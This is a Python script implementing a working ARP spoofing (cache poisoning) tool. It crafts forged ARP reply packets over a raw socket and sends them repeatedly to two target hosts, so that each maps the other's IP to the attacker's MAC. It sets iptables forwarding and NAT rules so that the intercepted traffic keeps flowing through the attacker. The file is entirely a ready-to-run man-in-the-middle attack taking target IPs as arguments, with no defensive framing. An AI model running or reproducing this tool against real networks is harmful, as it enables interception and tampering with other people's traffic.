import socket, subprocess, sys, time, os

class ArpSpoofing:
  def __init__(self) -> None:
    pass


  def ping(self, ipv4: str) -> None:
    os.system(f'ping {ipv4} -c 1')


  def get_mac_address(self, ipv4: str) -> bytes:
    arp_command = ['arp', '-n', ipv4]
    
    # Output looks like ['Address', 'HWtype', 'HWaddress', 'Flags', 'Mask', 'Iface', '192.168.0.4', 'ether', '12:34:56:78:90:12', 'C', 'wlp1s0']
    output = subprocess.check_output(arp_command).decode().split()

    # select the mac address and convert it to bytes
    mac_address = bytes.fromhex(output[8].replace(':', '', 5))
    return mac_address


  def get_interface(self, ipv4: str) -> str:
    arp_command = ['arp', '-n', ipv4]
    output = subprocess.check_output(arp_command).decode().split()
    
    # last element is the interface
    return output[-1]


  def ipv4_string_to_bytes(self, ipv4: str) -> bytes:
    # converts str ip into bytes
    ip_parts = [int(p).to_bytes(1, 'big') for p in ipv4.split('.')]
    ip = b''.join(ip_parts)
    return ip


  def get_my_mac_address(self, interface: str) -> bytes:
    output = subprocess.check_output(['ifconfig']).decode().split()

    # find the interface index, so we won't take the mac address from the wrong interface
    interface_idx = output.index(interface + ':')
    output = output[interface_idx:]

    # before the mac address there's the 'ether' keyword
    mac_idx = output.index('ether') + 1
    mac_address = bytes.fromhex(output[mac_idx].replace(':', '', 5))

    # return the mac adress in bytes
    return mac_address


  def create_ethernet_header(self, destination_mac: bytes, source_mac: bytes) -> bytes:
    PROTOCOL_TYPE = b'\x08\x06' # 0x0806 for ARP
    return destination_mac + source_mac + PROTOCOL_TYPE


  def create_arp_reply_header(self, sender_mac: bytes, sender_ipv4: bytes, target_mac: bytes, target_ipv4: bytes) -> bytes:
    HARDWARE_TYPE = b'\x00\x01' # 1 for Ethernet
    PROTOCOL_TYPE = b'\x08\x00' # 0x0800 for IPv4
    HARDWARE_SIZE = b'\x06' # 6 for Ethernet
    PROTOCOL_SIZE = b'\x04' # 4 for IPv4
    OPCODE = b'\x00\x02' # 2 for Reply
    return HARDWARE_TYPE + PROTOCOL_TYPE + HARDWARE_SIZE + PROTOCOL_SIZE + OPCODE + sender_mac + sender_ipv4 + target_mac + target_ipv4

  
  def poison_arp(self, ipv4_target_1: str, ipv4_target_2: str):
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)

    interface_1 = self.get_interface(ipv4_target_1)
    mac_target_1 = self.get_mac_address(ipv4_target_1)
    ipv4_target_1 = self.ipv4_string_to_bytes(ipv4_target_1)
    
    interface_2 = self.get_interface(ipv4_target_2)
    mac_target_2 = self.get_mac_address(ipv4_target_2)
    ipv4_target_2 = self.ipv4_string_to_bytes(ipv4_target_2)
    
    # POISON TARGET 1 MAC ADDRESS TABLE
    sock.bind((interface_1, 0))
    my_mac = self.get_my_mac_address(interface_1)

    ethernet_header_1 = self.create_ethernet_header(mac_target_1, my_mac)
    arp_reply_1 = self.create_arp_reply_header(my_mac, ipv4_target_2, mac_target_1, ipv4_target_1)

    packet_1 = ethernet_header_1 + arp_reply_1
    sock.send(packet_1)

    # POISON TARGET 2 MAC ADDRESS TABLE
    sock.bind((interface_2, 0))
    my_mac = self.get_my_mac_address(interface_2)

    ethernet_header_2 = self.create_ethernet_header(mac_target_2, my_mac)
    arp_reply_2 = self.create_arp_reply_header(my_mac, ipv4_target_1, mac_target_2, ipv4_target_2)
    
    packet_2 = ethernet_header_2 + arp_reply_2
    sock.send(packet_2)
    
    sock.close()


  def run(self, ipv4_target_1: str, ipv4_target_2: str, frequency: int = 1):
    try:
      os.system('iptables -A FORWARD -j ACCEPT')
      os.system('iptables -t nat -s 192.168.68.0/24 -A POSTROUTING -j MASQUERADE')
      os.system('iptables -t nat -A POSTROUTING -j MASQUERADE')
      os.system('iptables -A OUTPUT -j ACCEPT')

      self.ping(ipv4_target_1)
      self.ping(ipv4_target_2)

      print(f'Attaking {ipv4_target_1} and {ipv4_target_2}...')

      while True:
        self.poison_arp(ipv4_target_1, ipv4_target_2)
        time.sleep(frequency)
    except KeyboardInterrupt:
      print(f'ARP: deleting iptables rules')
      os.system('iptables -D FORWARD -j ACCEPT')
      os.system('iptables -t nat -s 192.168.68.0/24 -D POSTROUTING -j MASQUERADE')
      os.system('iptables -t nat -D POSTROUTING -j MASQUERADE')
      os.system('iptables -D OUTPUT -j ACCEPT')



if __name__ == '__main__':
  a = ArpSpoofing()
  a.run(sys.argv[1], sys.argv[2], 1)